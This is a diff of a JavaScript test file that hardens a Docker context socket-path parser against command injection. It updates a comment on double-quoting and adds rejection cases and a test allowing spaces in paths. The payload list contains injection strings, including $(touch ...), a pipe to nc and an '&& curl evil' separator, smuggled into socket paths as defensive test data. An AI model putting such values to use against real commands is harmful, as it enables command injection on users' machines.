@@ -48,9 +48,10 @@ describe('parseDockerContextSocket (#81)', () => {
     expect(parseDockerContextSocket(JSON.stringify([{ Endpoints: {} }]))).toBeNull();
   });
 
-  // Regression (#81, security): the path ends up UNquoted in a `docker run -v
-  // <path>:...` shell command. An attacker-influenceable docker context must
-  // not be able to smuggle in shell metacharacters -> command injection.
+  // Regression (#81, security): the path is interpolated into a `docker run -v
+  // "<path>:..."` shell command where it is double-quoted. An attacker-influenceable
+  // docker context must not smuggle in metacharacters that stay active inside double
+  // quotes ($, backtick, \) or command separators -> command injection.
   it('rejects paths with shell metacharacters (command injection)', () => {
     const payloads = [
       'unix:///tmp/$(touch /tmp/pwned)/.rd/docker.sock',
@@ -59,13 +60,21 @@ describe('parseDockerContextSocket (#81)', () => {
       'unix:///tmp/x|nc evil 1/.rd/docker.sock',
       'unix:///tmp/x && curl evil/.rd/docker.sock',
       'unix:///tmp/x\n/.rd/docker.sock',
-      'unix:///home/a b/.rd/docker.sock',
       'unix:///tmp/$HOME/.rd/docker.sock',
+      'unix:///tmp/x"y/.rd/docker.sock',
+      'unix:///tmp/x\\y/.rd/docker.sock',
     ];
     for (const host of payloads) {
       const json = JSON.stringify([{ Endpoints: { docker: { Host: host } } }]);
       expect(parseDockerContextSocket(json), host).toBeNull();
     }
+  });
+
+  it('accepts a path with spaces (legal home dir, e.g. macOS) — it is double-quoted at the sink', () => {
+    const json = JSON.stringify([
+      { Endpoints: { docker: { Host: 'unix:///Users/First Last/.rd/docker.sock' } } },
+    ]);
+    expect(parseDockerContextSocket(json)).toBe('/Users/First Last/.rd/docker.sock');
   });
 
   it('leaves ordinary (safe) absolute socket paths untouched', () => {
